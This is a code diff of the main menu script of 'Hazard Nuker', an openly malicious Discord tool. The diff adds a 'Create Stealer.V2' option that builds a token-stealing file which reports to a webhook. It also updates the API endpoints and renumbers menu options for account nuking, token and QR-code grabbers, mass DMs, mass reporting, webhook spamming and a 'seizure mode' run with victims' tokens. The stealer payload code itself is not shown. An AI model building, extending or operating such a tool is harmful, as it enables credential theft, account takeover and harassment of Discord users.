@@ -1,13 +1,13 @@
 # Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
 # Hazard Nuker under the GNU General Public Liscense v2 (1991).
 
-import os, requests, threading, ctypes
+import requests, threading
 
 from time import sleep
 from colorama import Fore, Style, init
 
 # I know you can import the modules alot better but just got so many issues with importing * so just did this instead
-from util.plugins.common import clear, print_slow, setTitle, getheaders, THIS_VERSION
+from util.plugins.common import clear, setTitle, getheaders, THIS_VERSION
 from util.plugins.update import search_for_updates
 import util.accountNuke
 import util.dmdeleter
@@ -21,6 +21,7 @@ import util.spamservers
 import util.statuschanger
 import util.tokendisable
 import util.create_token_grabber
+import util.create_stealer_V2
 import util.unfriender
 import util.webhookspammer
 import util.massdm
@@ -48,11 +49,11 @@ def main():
 {Fore.RESET}[{Fore.GREEN}1{Fore.RESET}]{Fore.BLACK} Nuke Account                                |{Fore.RESET}[{Fore.GREEN}10{Fore.RESET}]{Fore.BLACK} Disable Account
 {Fore.RESET}[{Fore.GREEN}2{Fore.RESET}]{Fore.BLACK} Unfriend all friends                        |{Fore.RESET}[{Fore.GREEN}11{Fore.RESET}]{Fore.BLACK} Status Changer
 {Fore.RESET}[{Fore.GREEN}3{Fore.RESET}]{Fore.BLACK} Delete and leave all servers                |{Fore.RESET}[{Fore.GREEN}12{Fore.RESET}]{Fore.BLACK} Create Token Grabber 
-{Fore.RESET}[{Fore.GREEN}4{Fore.RESET}]{Fore.BLACK} Spam Create New servers                     |{Fore.RESET}[{Fore.GREEN}13{Fore.RESET}]{Fore.BLACK} QR Code grabber 
-{Fore.RESET}[{Fore.GREEN}5{Fore.RESET}]{Fore.BLACK} Dm Deleter                                  |{Fore.RESET}[{Fore.GREEN}14{Fore.RESET}]{Fore.BLACK} Mass Report
-{Fore.RESET}[{Fore.GREEN}6{Fore.RESET}]{Fore.BLACK} Mass Dm                                     |{Fore.RESET}[{Fore.GREEN}15{Fore.RESET}]{Fore.BLACK} Webhook Destroyer
-{Fore.RESET}[{Fore.GREEN}7{Fore.RESET}]{Fore.BLACK} Enable Seizure Mode                         |{Fore.RESET}[{Fore.GREEN}16{Fore.RESET}]{Fore.RED} Exit
-{Fore.RESET}[{Fore.GREEN}8{Fore.RESET}]{Fore.BLACK} Get information from a targetted account    |
+{Fore.RESET}[{Fore.GREEN}4{Fore.RESET}]{Fore.BLACK} Spam Create New servers                     |{Fore.RESET}[{Fore.GREEN}13{Fore.RESET}]{Fore.BLACK} Create Stealer.V2 
+{Fore.RESET}[{Fore.GREEN}5{Fore.RESET}]{Fore.BLACK} Dm Deleter                                  |{Fore.RESET}[{Fore.GREEN}14{Fore.RESET}]{Fore.BLACK} QR Code grabber
+{Fore.RESET}[{Fore.GREEN}6{Fore.RESET}]{Fore.BLACK} Mass Dm                                     |{Fore.RESET}[{Fore.GREEN}15{Fore.RESET}]{Fore.BLACK} Mass Report
+{Fore.RESET}[{Fore.GREEN}7{Fore.RESET}]{Fore.BLACK} Enable Seizure Mode                         |{Fore.RESET}[{Fore.GREEN}16{Fore.RESET}]{Fore.BLACK} Webhook Destroyer
+{Fore.RESET}[{Fore.GREEN}8{Fore.RESET}]{Fore.BLACK} Get information from a targetted account    |{Fore.RESET}[{Fore.GREEN}17{Fore.RESET}]{Fore.RED} Exit
 {Fore.RESET}[{Fore.GREEN}9{Fore.RESET}]{Fore.BLACK} Log into an account                         |
 {Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Style.RESET_ALL}'''
     print(banner)
@@ -67,7 +68,7 @@ def main():
         message_Content = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.LIGHTRED_EX}'))
         r = requests.get(
-            'https://discord.com/api/v6/users/@me',
+            'https://discord.com/api/v9/users/@me',
             headers=getheaders(token))
         if r.status_code == 200:
             clear()
@@ -85,7 +86,7 @@ def main():
         token = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
         r = requests.get(
-            'https://discord.com/api/v6/users/@me',
+            'https://discord.com/api/v9/users/@me',
             headers=getheaders(token))
         if r.status_code == 200:
             clear()
@@ -103,7 +104,7 @@ def main():
         token = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
         r = requests.get(
-            'https://discord.com/api/v6/users/@me',
+            'https://discord.com/api/v9/users/@me',
             headers=getheaders(token))
         if r.status_code == 200:
             clear()
@@ -123,7 +124,7 @@ def main():
         Server_Name = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Name of the servers that will be created: {Fore.LIGHTRED_EX}'))
         r = requests.get(
-            'https://discord.com/api/v6/users/@me',
+            'https://discord.com/api/v9/users/@me',
             headers=getheaders(token))
         if r.status_code == 200:
             clear()
@@ -141,7 +142,7 @@ def main():
         token = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
         r = requests.get(
-            'https://discord.com/api/v6/users/@me',
+            'https://discord.com/api/v9/users/@me',
             headers=getheaders(token))
         if r.status_code == 200:
             clear()
@@ -161,7 +162,7 @@ def main():
         Message = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.LIGHTRED_EX}'))
         r = requests.get(
-            'https://discord.com/api/v6/users/@me',
+            'https://discord.com/api/v9/users/@me',
             headers=getheaders(token))
         if r.status_code == 200:
             clear()
@@ -179,13 +180,13 @@ def main():
         token = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
         r = requests.get(
-            'https://discord.com/api/v6/users/@me',
+            'https://discord.com/api/v9/users/@me',
             headers=getheaders(token))
         if r.status_code == 200:
             clear()
             threads = 100
             if threading.active_count() < threads:
-                threading.Thread(target=util.seizure.Seizure, args=(token, )).start()
+                threading.Thread(target=util.seizure.StartSeizure, args=(token, )).start()
                 return
         else:
             print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
@@ -202,7 +203,7 @@ def main():
         token = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
         r = requests.get(
-            'https://discord.com/api/v6/users/@me',
+            'https://discord.com/api/v9/users/@me',
             headers=getheaders(token))
         if r.status_code == 200:
             clear()
@@ -220,7 +221,7 @@ def main():
         token = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
         r = requests.get(
-            'https://discord.com/api/v6/users/@me',
+            'https://discord.com/api/v9/users/@me',
             headers=getheaders(token))
         if r.status_code == 200:
             clear()
@@ -237,7 +238,7 @@ def main():
         Status = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Custom Status: {Fore.LIGHTRED_EX}'))
         r = requests.get(
-            'https://discord.com/api/v6/users/@me',
+            'https://discord.com/api/v9/users/@me',
             headers=getheaders(token))
         if r.status_code == 200:
             clear()
@@ -266,8 +267,25 @@ def main():
             main()
         util.create_token_grabber.TokenGrabber(WebHook, fileName)
 
-
     elif choice == '13':
+        WebHook = str(input(
+            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}WebHook Url: {Fore.LIGHTRED_EX}'))
+        fileName = str(input(
+            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}File name: {Fore.LIGHTRED_EX}'))
+        try:
+            responce = requests.get(
+                WebHook)
+            if responce.status_code != 200:
+                print("\nInvalid Webhook")
+                sleep(1)
+                main()
+        except Exception as e:
+            print(f"an error occured\nignoring: {e}")
+            sleep(4)
+            main()
+        util.create_stealer_V2.TokenGrabberV2(WebHook, fileName)
+
+    elif choice == '14':
         WebHook = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}WebHook Url: {Fore.LIGHTRED_EX}'))
             
@@ -285,7 +303,7 @@ def main():
         util.QR_Grabber.QR_Grabber(WebHook)
 
 
-    elif choice == '14':
+    elif choice == '15':
         print(f"\n{Fore.LIGHTRED_EX}(the token you input is the account that will send the reports){Fore.RESET}")
         token = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
@@ -325,7 +343,7 @@ def main():
             print(f'\n{Fore.RED}Invalid Amount of reports.{Fore.RESET}')
             sleep(1)
             main()
-        r = requests.get('https://discord.com/api/v6/users/@me',headers=getheaders(token))
+        r = requests.get('https://discord.com/api/v9/users/@me',headers=getheaders(token))
         if r.status_code == 200:
             clear()
             util.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1, Amount)
@@ -335,7 +353,7 @@ def main():
             main()
 
 
-    elif choice == '15':
+    elif choice == '16':
         print(f'''
     {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Webhook Deleter
     {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Webhook Spammer    
@@ -393,7 +411,7 @@ def main():
             util.webhookspammer.WebhookSpammer(WebHook, Message, Timer)
             
 
-    elif choice == '16':
+    elif choice == '17':
         setTitle("Exiting...")
         choice = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Are you sure you want to exit? (Y to confirm): {Fore.LIGHTRED_EX}'))
@@ -401,7 +419,7 @@ def main():
             clear()
             Style.RESET_ALL
             Fore.RESET
-            os._exit(0)
+            exit()
         else:
             main()
     else:
